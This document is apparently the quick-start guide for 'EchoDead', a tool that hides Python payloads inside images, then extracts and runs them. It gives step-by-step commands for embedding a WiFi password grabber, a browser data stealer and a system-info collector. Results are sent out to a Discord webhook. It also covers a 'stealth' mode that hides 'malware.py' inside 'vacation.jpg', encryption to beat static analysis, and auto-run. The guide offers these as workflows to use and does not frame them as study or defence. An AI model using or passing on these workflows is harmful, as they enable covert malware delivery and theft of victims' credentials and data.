# Quick Start Guide

## Installation & Setup

### Step 1: Install Dependencies
```bash
pip install -r requirements.txt
```

### Step 2: Run Interactive Setup (Recommended)
```bash
python setup.py
```

This will guide you through:
- Discord webhook configuration
- Adding example payloads to library
- Creating test images
- Installing optional dependencies

---

## First Time Usage

### Option 1: Interactive Mode (Easiest)

```bash
python src/main.py
```

You'll see a beautiful menu:

```
╔═══════════════════════════════════════════════════════════════════════╗
║   ███████╗████████╗███████╗ ██████╗  █████╗ ███╗   ██╗ ██████╗        ║
║   EchoDead - Advanced ECHODEAD                         ║
╚═══════════════════════════════════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                    ECHODEAD
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

 [1] Quick Workflow        Embed → Extract → Run
 [2] Embed Payload         Hide payload in image
 [3] Extract Payload       Extract payload from image
 [4] Payload Management    Manage payload library
 [5] Settings              Configure tool options
 [6] Exit                  Quit application

Select option: _
```

### Option 2: Quick Command (Fast)

```bash
# Test with example payload
python src/main.py workflow test_image.png example_payloads/hello_world.py output.png --run
```

---

## Basic Workflows

### Workflow 1: Hide & Extract Payload

```bash
# 1. Create test image
python create_test_image.py

# 2. Embed payload
python src/main.py embed test_image.png example_payloads/system_info.py stego.png

# 3. Extract payload
python src/main.py extract stego.png extracted.py

# 4. Run extracted payload
python src/main.py run extracted.py
```

### Workflow 2: Encrypted Payload

```bash
# Embed with encryption
python src/main.py embed image.png payload.py encrypted_stego.png --password MySecretPassword

# Extract with decryption
python src/main.py extract encrypted_stego.png decrypted.py --password MySecretPassword
```

### Workflow 3: Discord Exfiltration

```bash
# 1. Configure webhook in example_payloads/webhook_utils.py
# Set WEBHOOK_URL to your Discord webhook

# 2. Run WiFi password grabber
python src/main.py workflow cover.png example_payloads/wifi_grabber.py output.png --run

# 3. Check your Discord channel for results!
```

---

## Configure for Your Use Case

### Scenario: Quick Reconnaissance

```bash
# Enable auto-run and compression
python src/main.py config set auto_run true
python src/main.py config set use_compression true

# Add all payloads to library
python src/main.py payload add example_payloads/wifi_grabber.py
python src/main.py payload add example_payloads/system_info.py
python src/main.py payload add example_payloads/browser_data.py

# Run quick workflow
python src/main.py
# Select option 1, choose payload from library
```

### Scenario: Maximum Stealth

```bash
# Enable encryption and stealth mode
python src/main.py config set encryption_enabled true
python src/main.py config set stealth_mode true
python src/main.py config set use_compression true

# Use encrypted workflow
python src/main.py workflow innocent_photo.jpg malware.py vacation.jpg --password Secret123
```

---

## Testing the Tool

### Test 1: Basic Functionality

```bash
# Test embed/extract cycle
python create_test_image.py
python src/main.py workflow test_image.png example_payloads/hello_world.py test_output.png --run

# Expected output: "Hello from Steganography!"
```

### Test 2: Encryption

```bash
# Test encrypted embed/extract
python src/main.py embed test_image.png example_payloads/hello_world.py encrypted.png --password test123
python src/main.py extract encrypted.png decrypted.py --password test123
python src/main.py run decrypted.py

# Should output: "Hello from Steganography!"
```

### Test 3: Discord Webhook

```bash
# Configure webhook first!
python example_payloads/webhook_utils.py

# Should see test message in Discord
```

---

## Common Issues & Solutions

### Issue: "Import PIL could not be resolved"
```bash
# Solution: Install Pillow
pip install Pillow
```

### Issue: "Import cryptography could not be resolved"
```bash
# Solution: Install cryptography
pip install cryptography
```

### Issue: "No module named 'colorama'"
```bash
# Solution: Install colorama
pip install colorama
```

### Issue: "Image too small!"
```bash
# Solution: Use larger image or compress payload
# Check capacity:
# Image capacity = width × height × 3 bits
# Payload size in bits = file_size × 8

# Example:
# 1000×1000 image = 3,000,000 bits capacity
# Can hold up to 375,000 bytes (375 KB)
```

### Issue: Wrong password for decryption
```bash
# Error: "Decryption failed"
# Solution: Use the exact same password used during embedding
```

---

## Next Steps

1. **Read the Documentation**
   - [README.md](README.md) - Full documentation
   - [FEATURES.md](FEATURES.md) - Advanced features guide
   - [PAYLOAD_GUIDE.md](PAYLOAD_GUIDE.md) - Payload descriptions

2. **Explore Example Payloads**
   - Review `example_payloads/` directory
   - Understand what each payload does
   - Create your own custom payloads

3. **Configure Discord Webhook**
   - Set up Discord server and webhook
   - Configure `webhook_utils.py`
   - Test exfiltration

4. **Experiment with Settings**
   - Try different encryption passwords
   - Test compression vs. no compression
   - Enable stealth mode

5. **Create Custom Payloads**
   - Write your own Python scripts
   - Add to payload library
   - Test with workflow

---

## Pro Tips

💡 **Use realistic cover images**: Vacation photos, memes, screenshots work best

💡 **Test before deployment**: Always verify embed→extract→run cycle works

💡 **Use encryption for sensitive payloads**: Protect against static analysis

💡 **Enable compression**: Reduces size by 30-70%, fits in smaller images

💡 **Check capacity first**: Ensure image is large enough for payload

💡 **Secure webhook URL**: Keep Discord webhook private

💡 **Use payload library**: Faster than typing paths every time

💡 **Enable auto-run in settings**: Skip manual extraction step

---

## Example Session

```bash
# Complete workflow from start to finish

# 1. Install dependencies
pip install -r requirements.txt

# 2. Create test image
python create_test_image.py

# 3. Configure Discord webhook
# Edit example_payloads/webhook_utils.py
# Set WEBHOOK_URL = "https://discord.com/api/webhooks/..."

# 4. Add payloads to library
python src/main.py payload add example_payloads/wifi_grabber.py
python src/main.py payload add example_payloads/system_info.py

# 5. Run encrypted workflow
python src/main.py workflow test_image.png example_payloads/system_info.py output.png --password secret123 --run

# 6. Check Discord for results!
```

---

**You're now ready to use the most sophisticated ECHODEAD! 🚀**
